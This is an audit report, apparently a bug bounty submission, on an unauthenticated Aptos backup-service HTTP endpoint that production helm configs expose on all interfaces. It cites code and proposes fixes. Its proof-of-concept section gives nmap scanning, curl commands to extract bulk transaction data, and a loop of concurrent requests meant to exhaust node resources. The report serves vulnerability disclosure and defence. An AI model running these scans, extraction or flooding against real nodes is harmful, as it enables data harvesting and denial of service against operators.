# Audit Report

## Title
Unauthenticated Access to Historical Transaction Data via Exposed Backup Service HTTP Endpoint

## Summary
The backup service HTTP endpoint exposes the `get_transaction_iter()` function without any authentication or authorization checks. Production configurations bind this service to all network interfaces (`0.0.0.0:6186`), allowing any network peer to read arbitrary ranges of historical transaction data, including WriteSets containing state changes, violating the documented localhost-only access model.

## Finding Description

The `BackupHandler::get_transaction_iter()` function provides access to complete historical transaction data without any caller authorization checks. [1](#0-0) 

This function is exposed via an unauthenticated HTTP GET endpoint in the backup service: [2](#0-1) 

The service creates HTTP routes without any authentication middleware, only logging: [3](#0-2) 

The backup service is started and bound to a configurable address: [4](#0-3) 

While the documentation states the backup service should only be accessible from localhost: [5](#0-4) 

Production configurations explicitly bind to all network interfaces: [6](#0-5) [7](#0-6) 

The backup service is started during node initialization: [8](#0-7) 

**Attack Path:**
1. Attacker identifies a fullnode with the backup service exposed on port 6186
2. Attacker sends HTTP GET request: `http://<node-ip>:6186/transactions/<start_version>/<num_transactions>`
3. Service calls `get_transaction_iter()` without any authorization check
4. Attacker receives full transaction data including Transaction payloads, TransactionInfo, ContractEvents, and WriteSets containing all state changes
5. Attacker can repeat with arbitrary version ranges to extract complete historical blockchain data

**Broken Invariant:**
This violates the **Access Control** invariant (#8): "System addresses (@aptos_framework, @core_resources) must be protected." More broadly, it violates the principle that administrative/operational interfaces should not be publicly accessible without authentication.

## Impact Explanation

This is a **High Severity** vulnerability according to Aptos bug bounty criteria:

1. **Significant Protocol Violation**: The backup service is documented for localhost-only administrative access but is exposed publicly without authentication, violating the documented security model.

2. **Information Disclosure**: Any network peer can read:
   - Complete transaction payloads and arguments
   - WriteSets containing all state changes (account balances, resources)
   - Events and transaction metadata
   - Arbitrary ranges of historical blockchain data

3. **Resource Exhaustion/DoS Potential**: Attackers can make unlimited large queries (e.g., requesting millions of transactions) without rate limiting, potentially exhausting node resources and causing validator node slowdowns or API crashes.

4. **No Authentication Required**: Exploitable by any network peer without special privileges.

## Likelihood Explanation

**Likelihood: HIGH**

- **Ease of Exploitation**: Requires only a simple HTTP GET request to an exposed port
- **Discovery**: Port 6186 can be easily discovered via network scanning
- **No Prerequisites**: No authentication, credentials, or special access required
- **Deployment Reality**: Production helm charts explicitly configure `0.0.0.0:6186`, meaning most fullnodes are vulnerable
- **Immediate Impact**: Exploitation can begin immediately upon discovering an exposed endpoint

## Recommendation

Implement multiple layers of protection:

1. **Change Default Binding**: Modify the default configuration to bind only to localhost:

```rust
// In config/src/config/storage_config.rs, line 436
backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
```

2. **Add Authentication Middleware**: Implement authentication in the backup service using API keys or JWT tokens:

```rust
// In storage/backup/backup-service/src/handlers/mod.rs
fn with_auth() -> impl Filter<Extract = (), Error = warp::Rejection> + Clone {
    warp::header::optional::<String>("authorization")
        .and_then(|auth: Option<String>| async move {
            match auth {
                Some(token) if validate_token(&token) => Ok(()),
                _ => Err(warp::reject::custom(Unauthorized)),
            }
        })
}

// Apply to all routes:
warp::get()
    .and(with_auth())
    .and(routes)
    // ...
```

3. **Add Rate Limiting**: Implement per-IP rate limiting to prevent DoS attacks.

4. **Network Segmentation**: Update deployment documentation to recommend firewall rules restricting port 6186 to trusted backup infrastructure only.

5. **Configuration Validation**: Add startup checks that warn or fail if backup service is bound to non-localhost addresses without explicit override.

## Proof of Concept

**Testing on a local node:**

```bash
# Assuming a node is running with default backup service configuration
# Request 10 transactions starting from version 100
curl -v "http://localhost:6186/transactions/100/10"

# The endpoint returns BCS-encoded transaction data without any authentication check
# Status 200 with transaction data proves unauthorized access
```

**Remote exploitation scenario:**

```bash
# Scan for exposed backup services
nmap -p 6186 <target-network-range>

# For each discovered endpoint, extract historical data
curl "http://<discovered-ip>:6186/transactions/0/1000000" > historical_data.bcs

# Parse the BCS-encoded data to extract transactions, events, and state changes
# This works without any credentials or authorization
```

**Impact demonstration:**

```bash
# Resource exhaustion attack - request millions of transactions
for i in {0..100}; do
    curl "http://<target>:6186/transactions/$((i*1000000))/1000000" &
done

# This creates 100 concurrent requests for 1M transactions each
# Without rate limiting, this can exhaust node resources
```

The vulnerability is exploitable on any Aptos fullnode deployed with the standard helm charts, as they explicitly configure the backup service to listen on all network interfaces without authentication.

## Notes

While blockchain data is generally public, the backup service is specifically designed as an administrative tool for node operators to create backups, not as a public API. The exposure of this service violates the documented security model and creates both information disclosure and DoS risks. The production configurations directly contradict the documented localhost-only access model, indicating a configuration management issue that affects deployed nodes.

### Citations

**File:** storage/aptosdb/src/backup/backup_handler.rs (L41-59)
```rust
    pub fn get_transaction_iter(
        &self,
        start_version: Version,
        num_transactions: usize,
    ) -> Result<
        impl Iterator<
                Item = Result<(
                    Transaction,
                    PersistedAuxiliaryInfo,
                    TransactionInfo,
                    Vec<ContractEvent>,
                    WriteSet,
                )>,
            > + '_,
    > {
        let txn_iter = self
            .ledger_db
            .transaction_db()
            .get_transaction_iter(start_version, num_transactions)?;
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L101-110)
```rust
    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L136-147)
```rust
    // Serve all routes for GET only.
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
}
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** storage/README.md (L64-66)
```markdown
  # Address the backup service listens on. By default the port is open to only
  # the localhost, so the backup cli tool can only access data in the same host.
  backup_service_address: "127.0.0.1:6186"
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L16-16)
```yaml
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L68-68)
```yaml
  backup_service_address: "0.0.0.0:6186"
```

**File:** aptos-node/src/storage.rs (L70-71)
```rust
            let db_backup_service =
                start_backup_service(node_config.storage.backup_service_address, db_arc.clone());
```
